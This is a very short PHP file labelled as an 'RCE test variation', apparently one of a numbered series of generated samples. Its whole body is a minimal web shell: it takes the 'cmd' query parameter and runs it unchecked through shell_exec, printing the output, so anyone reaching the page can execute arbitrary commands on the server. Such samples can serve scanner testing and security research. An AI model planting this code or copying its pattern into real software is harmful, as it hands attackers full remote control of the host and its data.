<?php
// RCE test variation #765
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>